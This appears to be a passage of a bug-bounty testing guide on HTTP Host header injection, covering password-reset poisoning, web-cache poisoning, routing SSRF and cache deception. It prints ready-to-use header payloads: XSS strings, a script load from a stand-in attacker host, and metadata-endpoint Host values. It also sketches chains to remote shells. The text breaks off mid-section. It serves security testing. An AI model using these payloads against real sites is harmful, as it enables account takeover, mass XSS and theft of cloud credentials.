# HTTP Host Header Injection — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** Any place the server trusts the **`Host`** (or `X-Forwarded-Host`/`X-Host`/`Forwarded`/absolute-URI/duplicate-Host) value and uses it in a **security-sensitive** way — password-reset/verification links, absolute redirects/links, cache keys, virtual-host routing, SSO/OAuth callbacks, server-side fetches
**Platforms:** Any stack; Kali/WSL for tooling
**Companion files in this folder:**
- `HOST_HEADER_ARSENAL.md` — every Host-spoofing header, duplicate/absolute-URI/line-wrap tricks, reset-poison & cache payloads (copy-paste)
- `HOST_HEADER_CHECKLIST.md` — the testing-order checklist you tick per app
- `HOST_HEADER_REPORT_TEMPLATE.md` — the report skeleton that gets paid
- `poc/` — runnable tooling (host-header prober, password-reset-poison helper, cache-poison detector)

> **Companion to the CORS / SSRF / Request-Smuggling / XSS guides.** Host header injection is deceptively powerful: a header *everyone* can set, trusted by the backend, becomes **account takeover** (password-reset poisoning), **mass compromise** (web-cache poisoning), or **internal access** (routing-based SSRF). The mistake hunters make is reporting "the Host header is reflected" as a bug. **Reflection is a condition, not impact.** The finding is *where that reflected/trusted host lands*: in a victim's reset email, in a cached response served to everyone, or in a server-side fetch that reaches internal systems. Read Part III before you report a reflected header.

---

> ### ⚡ READ THIS FIRST — why most Host-header reports underpay (or get closed)
> 1. **"Host is reflected" is not the bug.** It matters only when the reflected/trusted host is used **security-sensitively**: building a **password-reset link** (→ ATO), being **cached and served to others** (→ mass XSS/redirect), routing to **internal vhosts** (→ SSRF), or in an **absolute redirect** (→ open redirect/phishing). Find the *sink*, then prove the impact.
> 2. **Password-reset poisoning is the headline ATO.** If the reset email's link is built from the request's Host, set `Host: evil.com` (or `X-Forwarded-Host: evil.com`), trigger a reset for the victim, and the email links to `evil.com/reset?token=...` — when the victim clicks, **you get their token → account takeover** (§11). This is the single highest-value Host-header outcome.
> 3. **Web-cache poisoning turns one request into mass impact.** If a Host/`X-Forwarded-Host` is **reflected** *and* the response is **cacheable** (and the header is **unkeyed**), you poison the cached page for **every** user — store an XSS or a malicious redirect (§12). This is High–Critical because it hits all visitors.
> 4. **`X-Forwarded-Host` is the bypass.** Apps often validate `Host` but blindly trust `X-Forwarded-Host` / `X-Host` / `Forwarded` / an absolute URI in the request line / a **duplicate** Host header. When `Host` is locked, those almost always still poison the sink (§7).
> 5. **Routing-based SSRF is the sleeper Critical.** On some front-ends the Host header chooses the **back-end** to route to — change it and you reach **internal-only** vhosts/services, sometimes cloud metadata (§13). James Kettle's research: a Host header can be an SSRF primitive.
>
> **Where the money is (memorize this order):** ① **password-reset poisoning → account takeover — High (Critical if no/low interaction)** → ② **web-cache poisoning (reflected + cacheable) → stored XSS/redirect for all users — High–Critical** → ③ **routing-based SSRF → internal services / metadata creds → RCE/cloud — Critical** → ④ **absolute-redirect / link poisoning → phishing/OAuth-token theft — Medium–High** → ⑤ *then* a bare reflected Host with no sink as **Low/Info**, not a headline.

---

## Table of Contents

**▶ [Master Testing Sequence — the testing order](#master-testing-sequence--the-testing-order)**

**PART I — FOUNDATIONS, RECON & BASELINE**
1. [Environment & Tooling Setup](#1-environment--tooling-setup)
2. [Host-Header Anatomy — Sinks & Why It Pays](#2-host-header-anatomy)
3. [Reconnaissance — Find Every Host-Dependent Sink](#3-reconnaissance--find-every-host-dependent-sink)
4. [Baseline — Can You Influence the Effective Host?](#4-baseline--can-you-influence-the-effective-host)

**PART II — INJECTION & BYPASS (work in this order)**
5. [Spoofing the Host — the Header Set](#5-spoofing-the-host--the-header-set)
6. [Reflection vs Trust — Where Does It Land?](#6-reflection-vs-trust--where-does-it-land)
7. [Bypassing Host Validation (X-Forwarded-Host, duplicates, absolute URI)](#7-bypassing-host-validation)

**PART III — EXPLOITATION BY IMPACT (where the money is)**
8. [Mapping the Sink to an Attack](#8-mapping-the-sink-to-an-attack)
9. [Absolute-Redirect & Link Poisoning](#9-absolute-redirect--link-poisoning)
10. [Reflected-Host XSS](#10-reflected-host-xss)
11. [Password-Reset Poisoning → Account Takeover ⭐](#11-password-reset-poisoning--account-takeover)
12. [Web-Cache Poisoning → Mass XSS/Redirect ⭐](#12-web-cache-poisoning--mass-xssredirect)
13. [Routing-Based SSRF → Internal / Metadata → RCE/Cloud ⭐](#13-routing-based-ssrf--internal--metadata)
14. [Other Sinks (SSO/OAuth, business logic, host-based authz)](#14-other-sinks)

**PART IV — VALIDITY, SEVERITY & REPORTING (the bug-bounty layer)**
15. [The Validity-First Mindset](#15-the-validity-first-mindset)
16. [False Positives — STOP reporting these](#16-false-positives--stop-reporting-these-auto-reject-list)
17. [Severity Calibration](#17-severity-calibration--how-triagers-really-rate-host-header-bugs)
18. [Impact-Escalation Playbooks — "you found X, now do Y"](#18-impact-escalation-playbooks--you-found-x-now-do-y)
19. [Building a Professional, Safe PoC](#19-building-a-professional-safe-poc)
20. [Reporting, CWE/CVSS & De-duplication](#20-reporting-cwecvss--de-duplication)
21. [Automation & Red-Team Notes](#21-automation--red-team-notes)

**Appendices**
- [Appendix A — Host-Header Workflow Cheat Sheet](#appendix-a--host-header-workflow-cheat-sheet)
- [Appendix B — Host-Header Decision Tree](#appendix-b--host-header-decision-tree)
- [Appendix C — Important Links](#appendix-c--important-links)

---

# Master Testing Sequence — The Testing Order

> **This is the spine.** Work top-to-bottom. Numbered sections (1–21) are reference detail; this is the order you execute.

```
PHASE 0  RECON            → find sinks that USE the host: reset/verify links, redirects, cache, routing, SSO (§3)
PHASE 1  BASELINE  ★      → can you change the EFFECTIVE host (Host / X-Forwarded-Host / etc.)? does it reach a sink? (§4)
PHASE 2  INJECT/BYPASS    → spoof the host (§5) · find where it lands (reflect vs trust §6) · bypass validation (§7)
PHASE 3  IMPACT  ⭐ (money)→ map sink → attack (§8):
                            absolute-redirect/link poison (§9) · reflected-host XSS (§10) ·
                            PASSWORD-RESET POISONING → ATO (§11) · CACHE POISONING → mass XSS (§12) ·
                            ROUTING SSRF → internal/metadata → RCE/cloud (§13) · SSO/authz (§14)
PHASE 4  VALIDATE→REPORT  → validity (§15) · false-positive filter (§16) · severity+CVSS+CWE-644/74 (§17) ·
                            SAFE PoC: own accounts, benign markers (§19) · dedup (§20) · report template
```

**Phase-by-phase, with the deliverable before moving on:**

1. **PHASE 0 — Recon.** Find every **host-dependent sink** — password-reset/verification, absolute redirects/links, cache, vhost routing, SSO callbacks (§3). *Deliverable:* a list of sinks.
2. **PHASE 1 — Baseline ⭐.** Determine whether you can influence the **effective host** the app uses (via `Host` or a forwarding header) and whether it reaches a sink (§4). *Deliverable:* a controllable host that lands somewhere meaningful.
3. **PHASE 2 — Inject/bypass.** Spoof the host with the full header set (§5), locate where it's **reflected vs trusted** (§6), and bypass any `Host` validation (§7). *Deliverable:* attacker-controlled host reaching the sink.
4. **PHASE 3 — Impact ⭐.** Convert the sink into the highest impact: reset-poisoning → ATO (§11), cache poisoning → mass XSS/redirect (§12), routing SSRF → internal/metadata → RCE/cloud (§13), redirect/link poisoning (§9), reflected XSS (§10), SSO/authz (§14). *Deliverable:* a demonstrated impact (stolen reset token / poisoned cache / internal reach).
5. **PHASE 4 — Validate → report.** Apply validity & FP filters (§15/§16), set CVSS/CWE (§17), build a *safe* PoC with your own accounts (§19), de-dup, write it (§20). *Deliverable:* the submitted report.

Reference anytime: payloads → `HOST_HEADER_ARSENAL.md`; checklist → `HOST_HEADER_CHECKLIST.md`; scripts → `poc/`; playbooks **§18**.

---

# PART I — FOUNDATIONS, RECON & BASELINE

# 1. Environment & Tooling Setup

| Tool | Job |
|------|-----|
| **Burp Suite** (Repeater/Intruder) | set/replay `Host` & forwarding headers; the core tool (browsers won't let you spoof Host) |
| **curl** | quick CLI Host/X-Forwarded-Host tests (`-H "Host: evil.com"` / `--resolve`) |
| **`poc/hosthdr_probe.py`** | spray the Host-spoofing header set; detect reflection in body/links/redirects |
| **`poc/reset_poison.py`** | walk a password-reset flow with a spoofed host; flag if the link host changes |
| **`poc/cache_poison.py`** | check reflected-Host + cacheability (Age/Cache-Control/X-Cache) for cache poisoning |
| **interactsh / Burp Collaborator** | OOB for routing-SSRF confirmation + reset-link callbacks |
| **Param Miner (BApp)** | finds unkeyed headers / cache-poisoning inputs automatically |
| **a domain you control + a mailbox** | to host the poisoned link target and (for reset-poisoning PoC) receive your own token |

```bash
# Kali/WSL
curl -s -D - -o /dev/null https://target/ -H "Host: evil.com" | grep -iE 'location|evil'
python3 poc/hosthdr_probe.py -u https://target/
python3 poc/cache_poison.py -u https://target/ --header X-Forwarded-Host
```
> **Burp is essential.** Browsers set `Host` automatically and won't let you spoof it; you tamper it in Burp/curl. For cache poisoning, watch `X-Cache: hit/miss`, `Age`, and `Cache-Control` to confirm your poisoned response is **stored**.

---

# 2. Host-Header Anatomy

## 2.1 What it is
HTTP requests carry a `Host` header naming the site you want. Frameworks expose it (`request.host`, `$_SERVER['HTTP_HOST']`, `X-Forwarded-Host` behind proxies) and developers often use it to **build absolute URLs** (reset links, redirects), **key caches**, or **route** to a backend. Since the client controls the header, trusting it is the bug.

## 2.2 The sinks that matter (decides the attack)
```
RESET/VERIFY LINK  → email link built from host  → poison → ATO (§11). ⭐ highest value.
CACHE             → host reflected + response cached + header unkeyed → mass XSS/redirect (§12). ⭐
ROUTING           → host selects the backend     → internal vhosts/metadata → SSRF → RCE/cloud (§13). ⭐
REDIRECT/LINK     → absolute redirect/canonical/og built from host → open redirect/phishing/OAuth theft (§9).
REFLECTED HTML    → host echoed into the page → reflected XSS (§10).
AUTHZ/BUSINESS    → host gates access or logic (admin vhost, tenant) → bypass (§14).
```

## 2.3 The headers you can use to influence the host
```
Host:                       the primary; may be validated.
X-Forwarded-Host:           the classic bypass — trusted by frameworks even when Host is locked.
X-Host:  X-Forwarded-Server:  X-HTTP-Host-Override:  X-Original-Host:  X-Original-URL:  (framework/proxy specific)
Forwarded: host=evil.com    (RFC 7239)
Absolute URI in request line:  GET https://evil.com/path HTTP/1.1
Duplicate Host headers / line-wrapped Host / Host with port or userinfo  (parser-discrepancy bypasses, §7)
```

## 2.4 Why it pays
- **ATO from a header** — reset-poisoning needs only the victim's email + a clicked link.
- **Everyone-at-once** — cache poisoning serves your payload to all users of a cached page.
- **Perimeter break** — routing SSRF turns a header into reach into the internal network/cloud.

> **The mental model:** the Host header is **client-controlled identity the backend wrongly trusts.** Severity = *what the app does with the host* — email you a link, cache it for others, or route on it.

---

# 3. Reconnaissance — Find Every Host-Dependent Sink

```
□ Password reset / email verify / invite / "magic link": these build a URL from the host → top target (§11).
□ Redirects after login/logout/SSO; canonical tags; og:url/sitemap; "share" links → absolute-URL sinks (§9).
□ Cacheable pages: static-ish pages behind a CDN/cache (look for X-Cache/Age/Cache-Control) → cache poisoning (§12).
□ Multi-tenant / vhost routing: subdomain or Host decides the app/backend → routing SSRF / authz (§13/§14).
□ Reflected host: any page that echoes the host in the body (rare but → XSS) (§10).
□ SSO/OAuth: callback/redirect_uri derived from host → token theft (§14).
□ Email headers/footers, PDF generation that embeds links from host.
```
> **If this → then that:** a **password-reset** feature exists → that's your first and highest-value test (§11) — request a reset with a spoofed host and read where the link points. A page sits behind a **CDN/cache** (X-Cache header) and reflects any header → test **cache poisoning** (§12). A **multi-tenant** app routing by Host → test **routing SSRF** (§13).

---

# 4. Baseline — Can You Influence the Effective Host?

**Do this before chasing a specific impact.** Establish whether the app uses a host you can control.

## 4.1 The baseline probes
```
1. Set  Host: evil.com           → does the app accept it (200) or reject (400/redirect)? Is "evil.com" reflected anywhere?
2. Set  X-Forwarded-Host: evil.com (keep a valid Host) → reflected/used? (often yes even when Host is validated)
3. Append to a valid host:  Host: target.com.evil.com  /  Host: target.com:evil.com  → reflected?
4. Watch for the host in: the response body, a Location redirect, links/canonical/og, and (later) an email.
```

## 4.2 Classify what you can do
```
□ Host fully controllable + reaches a sink         → straight to the matching impact (§9–§14).
□ Host validated but X-Forwarded-Host trusted      → use the forwarding header (§7) → impact.
□ Host reflected only in a cacheable response      → cache poisoning (§12).
□ Host used to BUILD links (reset/redirect)        → reset-poisoning / redirect-poisoning (§11/§9).
□ Host used to ROUTE                                → routing SSRF (§13).
□ Host reflected but no security use               → likely Low/Info (§16) — keep looking for a real sink.
```

> **Don't stop at "evil.com is reflected."** Reflection is Phase 1. The report is the **sink impact** (a poisoned reset email, a cached XSS, an internal fetch). If you can't find a security-sensitive sink, a bare reflected Host is usually **Low/Info** (§16).

---

# PART II — INJECTION & BYPASS (work in this order)

> Full payload lists are in `HOST_HEADER_ARSENAL.md`.

# 5. Spoofing the Host — the Header Set

```
Host: evil.com                                   (primary)
X-Forwarded-Host: evil.com                        (classic bypass)
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
X-Original-Host: evil.com
Forwarded: host=evil.com
GET https://evil.com/path HTTP/1.1               (absolute URI in the request line)
Host: target.com                                  ← duplicate Host (send two; backends pick differently)
Host: evil.com
```
Send each (one at a time, then in combinations) and observe the sink. Keep a **valid** `Host` when testing forwarding headers (the request still needs to route).

> **If this → then that:** `Host: evil.com` is rejected (400/redirect to canonical) → try **`X-Forwarded-Host: evil.com`** with a valid `Host` — it's trusted far more often than people expect. Still nothing → duplicate-Host / absolute-URI / line-wrap tricks (§7).

## 5.1 Related forwarding headers with their *own* sinks (test these too)
Beyond the host, proxies trust a family of `X-Forwarded-*` and override headers — each with a distinct, often-missed impact:
```
X-Forwarded-Scheme: http   /  X-Forwarded-Proto: http   → app builds links/redirects with the wrong scheme.
   Classic chain: X-Forwarded-Proto: http on an HTTPS site → the app issues a redirect to http:// → combine with an
   open redirect or a cache to force users to an attacker page; sometimes triggers an infinite redirect (DoS) or
   downgrades reset/SSO links.
X-Forwarded-Port: 1337  /  X-Forwarded-Host: evil.com:1337 → the port lands in absolute links/redirects → SSRF/redirect.
X-Original-URL: /admin   /  X-Rewrite-URL: /admin  /  X-Override-URL  → override the request PATH after the front-end's
   access-control ran on the original path → ACL/auth bypass to internal/admin paths (the "path-override" trick;
   cross-ref the front-end-control-bypass idea in the Request-Smuggling kit).
X-Forwarded-For / True-Client-IP / X-Real-IP → spoof source IP → IP-allowlist bypass, rate-limit bypass, log spoofing,
   and SSRF when the value is fetched.
```
> **If this → then that:** the app reflects/uses **`X-Forwarded-Proto`/`-Scheme`** → force `http` to downgrade links/redirects (then chain a cache or open redirect). **`X-Original-URL`/`X-Rewrite-URL`** accepted → override the path *after* the proxy's ACL check → reach `/admin`/internal endpoints the front-end blocks. Test the whole forwarding family, not just the host.

---

# 6. Reflection vs Trust — Where Does It Land?

```
REFLECTED (you see evil.com in the response):
  □ in the body → maybe XSS (§10) or cache poisoning if cacheable (§12).
  □ in a Location/redirect → open redirect/phishing (§9).
  □ in canonical/og/links → SEO/phishing, cache poisoning vector (§12).
TRUSTED (you DON'T see it, but it's used server-side):
  □ in an email reset/verify link → reset-poisoning (§11) — you only see it in the EMAIL.
  □ in routing → routing SSRF (§13) — you see it as different backend content / an OOB hit.
  □ in cache key vs not (unkeyed) → cache poisoning (§12).
```
> **If this → then that:** the host is **reflected in the body** of a **cacheable** page → cache poisoning (§12). It's **not** reflected but the app **emails** you links → trigger the email and inspect the link host (reset-poisoning, §11). It changes which **backend** answers → routing SSRF (§13).

---

# 7. Bypassing Host Validation

When `Host` is validated, route around it:
```
Forwarding headers (most reliable):  X-Forwarded-Host / X-Host / X-Forwarded-Server / X-Original-Host / Forwarded: host=
Duplicate Host:                       send TWO Host headers — front-end validates the first, backend uses the second (or vice versa).
Absolute request-line URI:            GET https://evil.com/reset HTTP/1.1  (with Host: target.com) — some stacks prefer the URI.
Line wrapping / injection:            Host: target.com\r\n Host: evil.com   |  Host:\x20target.com\x09evil.com  (indentation/whitespace)
Port / userinfo:                      Host: target.com:@evil.com  |  Host: evil.com:80  |  Host: target.com@evil.com
Suffix/prefix on a "contains" check:  Host: target.com.evil.com  |  Host: eviltarget.com  (weak validation)
Trailing dot / case:                  Host: target.com.  |  Host: TARGET.com
SNI vs Host mismatch:                 valid SNI, evil Host (front-end routes on SNI, app trusts Host).
```
> **If this → then that:** `Host` is locked → **`X-Forwarded-Host`** is the first and usually-winning bypass. If the app validates `Host` against an allowlist with a weak match, use the **suffix/prefix** tricks (`target.com.evil.com`). Behind a CDN, a **duplicate Host** or **absolute URI** often splits front-end vs backend parsing (this overlaps with request smuggling — see that kit).

---

# PART III — EXPLOITATION BY IMPACT (where the money is)

> Use **your own** accounts for reset-poisoning, **benign markers** for cache poisoning, and your **own** OOB host for routing SSRF (§19).

# 8. Mapping the Sink to an Attack

```
Sink (from §6)                         Attack                              Severity ceiling
─────────────────────────────────────────────────────────────────────────────────────────
reset/verify email link from host      Password-reset poisoning → ATO      High (Critical if no interaction)   §11 ⭐
host reflected + response cacheable     Web-cache poisoning → mass XSS       High–Critical                       §12 ⭐
host selects backend (routing)          Routing-based SSRF → internal/meta   Critical (→ RCE/cloud)              §13 ⭐
host in absolute redirect/link          Open redirect / phishing / OAuth     Medium–High                         §9
host reflected in HTML                  Reflected XSS                        Medium–High                         §10
host gates access/tenant/logic          Authz bypass / business logic        Medium–High                         §14
host reflected, NO security use         (likely Low/Info)                    Low                                 §16
```

# 9. Absolute-Redirect & Link Poisoning

```
□ Login/logout/SSO redirect built from host → set Host: evil.com → you're redirected to evil.com (open redirect).
□ Canonical/og:url/sitemap built from host → SEO poisoning / phishing seed.
□ Emails/notifications embedding absolute links → phishing with a trusted-looking sender but attacker links.
```
> **If this → then that:** the post-login `Location` is built from the host → open redirect → **OAuth/token theft** if a token rides the redirect (cross-ref CORS/SSRF). On its own, open redirect is Medium; it climbs when it leaks a token or seeds the reset-poison/phishing chain.

---

# 10. Reflected-Host XSS

If the host is reflected **unencoded** into HTML/JS:
```
Host: evil.com"><script>alert(document.domain)</script>
X-Forwarded-Host: "><img src=x onerror=alert(document.domain)>
```
This is XSS sourced from a header. Weaponize via the **XSS kit** (session/token theft → ATO). If it's also **cacheable**, it becomes **stored** XSS for all users (§12) — far more severe.

> **If this → then that:** host reflected unencoded → XSS; if the page is **cached**, you've got **cache-poisoned stored XSS** hitting every visitor (§12) — escalate the severity accordingly.

---

# 11. Password-Reset Poisoning → Account Takeover ⭐

The highest-value Host-header bug. If the reset email's link is built from the request host, you steal the victim's reset token.
```
1. Confirm the sink: request a reset for YOUR OWN account with Host: evil.com (or X-Forwarded-Host: evil.com).
   Read YOUR email — does the link point to evil.com/reset?token=...?  → poisoning confirmed.
2. Exploit (own-account PoC): the link host is attacker-controlled, so when a VICTIM clicks the link in THEIR reset
   email, their browser sends the token to evil.com → you use it to set their password → ATO.
   (Some flows send the token to the host directly, or fetch the host server-side → token leaks even without a click.)
3. Variants:
   - X-Forwarded-Host poisoning when Host is validated.
   - "dangling markup"/partial host injection if only part of the URL is host-derived.
   - Token in a server-side callback to the host → no victim click needed (stronger).
```
**Safe PoC (own accounts):** trigger a reset on **your own** test account with the spoofed host; show the email link now points to your host and the token arrives there. That proves ATO without touching a real user.

> **If this → then that:** the reset link host = the request Host/`X-Forwarded-Host` → **password-reset poisoning → ATO**. Severity is **High**; it's **Critical** when no victim interaction is needed (server-side token callback) or when combined with a way to receive the token silently. This is *the* Host-header money bug — test it first.

---

# 12. Web-Cache Poisoning → Mass XSS/Redirect ⭐

Turn a reflected host + a cache into a payload served to **everyone**.
```
1. Confirm reflection: Host/X-Forwarded-Host value appears in the response body/links.
2. Confirm cacheability: response has Age / Cache-Control: public / X-Cache: hit on repeat → it's cached.
3. Confirm the header is UNKEYED: the cache key ignores your header (Param Miner) → your poisoned variant is served to others.
4. Poison: inject a payload via the header that lands in the cached response:
   X-Forwarded-Host: evil.com"><script src=//evil.com/x.js></script>   → stored XSS for all who get the cached page.
   X-Forwarded-Host: evil.com   → cached absolute links/redirects point at evil.com → mass redirect/phishing.
5. Prove safely: poison a NON-shared cache key first (a unique path/query you control), with a BENIGN marker, then
   describe the shared-cache impact — don't poison a high-traffic page for real users (§19).
```
> **If this → then that:** host reflected **+** response cacheable **+** header unkeyed → **web-cache poisoning**: one request stores your XSS/redirect for every subsequent visitor → **High–Critical** (mass stored XSS / mass redirect). Use Param Miner to find the unkeyed header and prove it on a benign cache key (keying nuances below).

## 12.1 Cache-key flaws & the unkeyed-input set (the keying that decides exploitability)
A cache serves a stored response when the **cache key** matches. The bug is an input that **changes the response but is NOT in the key** ("unkeyed") — so an attacker's variant gets served to victims whose request has the same key.
```
□ The cache key is usually: method + host + path + (some) query + a few headers. Everything else is UNKEYED.
□ Cache-buster discipline: always test with a UNIQUE query (?cb=<rand>) so YOU only poison YOUR key — never a real page.
□ Unkeyed inputs to hunt (Param Miner "guess headers"/"guess params"):
    X-Forwarded-Host / X-Host / X-Forwarded-Scheme / X-Forwarded-Proto / X-Forwarded-Port / X-Forwarded-Server
    X-Original-URL / X-Rewrite-URL · custom app headers · sometimes a Cookie or an unkeyed query param.
□ Keyed-but-flawed: the key normalizes oddly (case, port, trailing slash, %-decoding) → "cache key normalization" lets
    your malicious request collapse onto a victim's key.
□ Cache parameter cloaking / "fat GET": a body or duplicate param the cache ignores but the origin honors → poison.
□ Response-splitting into the cache: an unkeyed header reflected unencoded → store XSS/redirect for the keyed URL.
□ Internal cache poisoning: even an "unexploitable" reflected value can poison an INTERNAL cache the app reuses.
```
> **The keying rule:** an input is exploitable for poisoning only if it (a) **changes the response** and (b) is **unkeyed**. Prove it: send the poison with a unique cache-buster, then a clean request to the **same keyed URL** (no poison header) and confirm your payload is served from cache (`X-Cache: hit` / `Age`). Then *describe* the shared-key impact — don't poison a real high-traffic page (§19).

## 12.2 Web Cache Deception (WCD) — the cache-storing twin (often missed)
The mirror of poisoning: instead of poisoning a public page, you trick the cache into **storing a victim's PRIVATE, authenticated response under a URL YOU can then read.** No Host header needed — it's a path/extension confusion:
```
1. The cache caches by EXTENSION/path rules (e.g. "always cache *.css/*.js/*.jpg, ignore auth").
2. The origin IGNORES a trailing path segment and still returns the authenticated page:
     /account/info        → the victim's private account page (not cached)
     /account/info/x.css  → the SAME private page, but the cache sees ".css" → CACHES it (unkeyed on auth)
3. You send the victim a link to /account/info/x.css (or just wait); the cache stores their private response.
4. You then request /account/info/x.css yourself → you read the VICTIM's cached private data (PII/token/CSRF token).
Variants: /account%2F..%2F style, ;.css, ?.css, encoded delimiters; any "static-looking" suffix the origin tolerates.
```
> **If this → then that:** the origin returns the **same authenticated page** for `/account` and `/account/x.css` **and** the cache caches `*.css` regardless of auth → **Web Cache Deception**: an attacker reads other users' private responses (PII, tokens) → **High–Critical**. Test by appending `/x.css`, `;x.css`, `%2Fx.css` to authenticated pages and checking whether the response is cached (and readable unauthenticated). Prove with your **own** account; don't harvest real users.

---

# 13. Routing-Based SSRF → Internal / Metadata → RCE/Cloud ⭐

On some front-ends the Host header decides **which backend** the request is routed to — change it to reach internal-only systems.
```
1. Set Host to an internal name/IP the front-end will route to:
   Host: localhost   Host: 127.0.0.1   Host: 169.254.169.254   Host: internal-admin   Host: <internal-vhost>
   (or via X-Forwarded-Host / absolute URI). Watch for DIFFERENT (internal) content or an OOB hit.
2. If you reach internal HTTP → read internal/admin apps, unauth services (SSRF kit §12).
3. If you reach 169.254.169.254 → cloud metadata → IAM creds → cloud takeover (SSRF kit §11). ⭐
4. Confirm blind via OOB: Host: YOURID.oast.pro → a DNS/HTTP hit from the front-end proves routing reach.
```
> **If this → then that:** changing the Host returns **different/internal** content or hits your OOB host → **routing-based SSRF**. Steer it to **`169.254.169.254`** for cloud-metadata IAM creds (→ cloud account takeover) or to **internal admin** services — both **Critical**. Hand off to the **SSRF kit** for metadata/gopher/internal-service exploitation.

## 13.1 Host header → RCE / shell (the chain) ⭐ CRITICAL
Host header bugs reach a shell through their chains — pursue these for the top severity:
```
□ Routing SSRF → cloud metadata IAM creds → a cloud "run-command"/SSM/function surface → REMOTE SHELL. CRITICAL
□ Routing SSRF → internal ADMIN/unauth service with a code-exec feature (deploy/import/template/upload) → RCE. CRITICAL
□ Routing SSRF → internal Redis/gopher-reachable service → RCE (SSRF kit §13). CRITICAL
□ Cache-poisoned stored XSS → ADMIN session/JS → admin "run code"/plugin/template feature → web shell/RCE. CRITICAL
□ Reset-poisoning → take over an ADMIN account → admin code-exec feature → RCE. HIGH→CRITICAL
```
> **The Host→RCE rule:** a Host-header bug is "only" ATO/SSRF until the host you reach (or the account you take over) grants **code execution**. Always ask "**does this internal target or hijacked account let me run a command?**" — internal admin (→ code-exec feature), cloud metadata (→ cloud shell), or an admin ATO (→ admin RCE feature) turns a High Host-header bug into a **Critical RCE chain**. Prove the shell on your own tenant/account, validate creds read-only, and stop (§19).

---

# 14. Other Sinks (SSO/OAuth, business logic, host-based authz)

```
□ SSO/OAuth: redirect_uri/callback derived from host → set host to evil.com → auth code/token delivered to you → ATO
   (cross-ref the JWT/CORS kits). 
□ Host-based authz: an "admin"/"internal" vhost trusted by host → spoof it → reach privileged functionality.
□ Multi-tenant confusion: host selects the tenant → cross-tenant data access (IDOR-like).
□ Email spoofing / notification injection: host controls sender links → phishing.
```
> **If this → then that:** an OAuth flow builds the callback from the host → Host injection can deliver the **auth code/token to your domain** → account takeover. A privileged **vhost** trusted purely on Host → spoof it for **authz bypass**.

---

# PART IV — VALIDITY, SEVERITY & REPORTING

# 15. The Validity-First Mindset

## 15.1 The four questions a triager asks (answer them in your report)
1. **Is the host attacker-controlled at a security sink?** Show the spoofing header reaching the **reset link / cache / routing / redirect** — not just reflected.
2. **What concrete impact?** ATO (reset token), mass stored XSS (cache), internal/metadata reach (routing), token theft (SSO). Name + demonstrate it.
3. **What does the attacker need?** Reset-poisoning needs the victim's email (+ maybe a click); cache/routing often need nothing.
4. **Reproducible & in scope?** Exact request with the header, and the evidence (poisoned email link / cached response / internal content / OOB hit).

## 15.2 The "reflection vs sink" rule (most important)
| You have | Standalone verdict | Becomes valuable when… |
|---|---|---|
| Host reflected in body, no sink | Low/Info | …it's cacheable (§12) or XSS-able (§10). |
| Host in a reset/verify email link | **High** | …you show the token reaches your host → ATO (§11). |
| Host reflected + cacheable + unkeyed | **High–Critical** | …you poison the shared cache (XSS/redirect) (§12). |
| Host changes the backend (routing) | **Critical** | …you reach internal/metadata (SSRF) (§13). |
| Host in an absolute redirect | Medium | …it leaks a token or seeds OAuth theft (§9/§14). |
| `X-Forwarded-Host` trusted where Host isn't | (vector) | …it reaches any of the above sinks (§7). |

## 15.3 Production-scope discipline
Confirm on **production** with your **own** accounts (reset-poisoning) and **benign** markers (cache). For cache poisoning, prove on a **non-shared** cache key to avoid harming real users, then describe the shared impact. Re-test partial fixes (validating `Host` but still trusting `X-Forwarded-Host` is a fresh valid finding).

---

# 16. False Positives — STOP reporting these (auto-reject list)

| # | Commonly mis-reported | Why it's NOT (by default) | When it IS valid |
|---|---|---|---|
| 1 | **"Host header is reflected"** (no sink) | Reflection isn't impact. | It's cached (§12), XSS-able (§10), or in a security link (§11/§9). |
| 2 | **`X-Forwarded-Host` accepted** (no observable effect) | Accepting ≠ using. | It reaches a reset link / cache / routing sink. |
| 3 | **Changing Host gives a 400/redirect-to-canonical** | That's the app **defending** correctly. | A bypass (X-Forwarded-Host/dup/absolute) still poisons a sink. |
| 4 | **Reset email link uses a FIXED, configured domain** | Not host-derived → not poisonable. | The link host equals the request host/X-Forwarded-Host. |
| 5 | **"Cache poisoning" with no proof of caching / keyed header** | Not actually stored for others. | Age/X-Cache:hit + unkeyed header proven (§12). |
| 6 | **Self-only Host change affecting only your response** | No cross-user/shared impact. | Shared cache, victim email, or internal routing. |
| 7 | **Open redirect via Host reported as Critical** | Usually Medium alone. | It leaks tokens / chains to ATO. |
| 8 | **Routing "SSRF" that only reaches the same public app** | No internal reach. | Different/internal backend or metadata reached (§13). |

> Rule of thumb: if you can't say *"the host I control reaches `<a reset email / a shared cache / an internal backend / an OAuth callback>` and produces `<ATO / mass XSS / internal reach / token theft>`,"* you have a **reflected/accepted header, not a Host-header vulnerability** — usually Low/Info. Find the sink and prove the impact.

---

# 17. Severity Calibration — how triagers really rate Host-header bugs

| Scenario | Typical | What moves it |
|---|---|---|
| **Routing SSRF → metadata IAM creds / internal admin → RCE/cloud** | **Critical** | Internal/cloud reach → code exec (§13). |
| **Cache poisoning → stored XSS for all users** | **High–Critical** | Mass impact; XSS → ATO. |
| **Password-reset poisoning → ATO** | **High** | Critical if no victim interaction (server-side token callback). |
| **Cache poisoning → mass redirect/phishing** | **High** | Affects all visitors. |
| **SSO/OAuth callback poisoning → token theft → ATO** | **High** | Direct account takeover. |
| **Absolute open redirect via Host** | **Medium** | Up if token leak / chain. |
| **Reflected-Host XSS (not cached)** | **Medium–High** | Standard XSS impact. |
| **Reflected/accepted host, no sink** | **Low/Info** | Not a vuln alone. |

**CVSS / CWE:**
- Reset-poisoning ATO: `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` → High (~8). **CWE-640** (Weak Password Recovery) + **CWE-644** (Improper Neutralization of HTTP Headers).
- Cache poisoning (stored XSS): `S:C` → High–Critical. **CWE-444**/**CWE-349** + CWE-79.
- Routing SSRF: **CWE-918**; Host-header class anchor **CWE-644 / CWE-74** (injection).

---

# 18. Impact-Escalation Playbooks — "you found X, now do Y"

### 18.1 You found: *the Host header is reflected*
- **Escalate:** is the page **cacheable** (Age/X-Cache)? → cache poisoning (§12). Reflected **unencoded** in HTML? → XSS (§10). In a **redirect**? → open redirect/OAuth (§9).
- **Evidence:** the cached poisoned response / firing XSS / the redirect.
- **Severity:** Low → High–Critical depending on the sink.

### 18.2 You found: *the reset email link uses the request host*
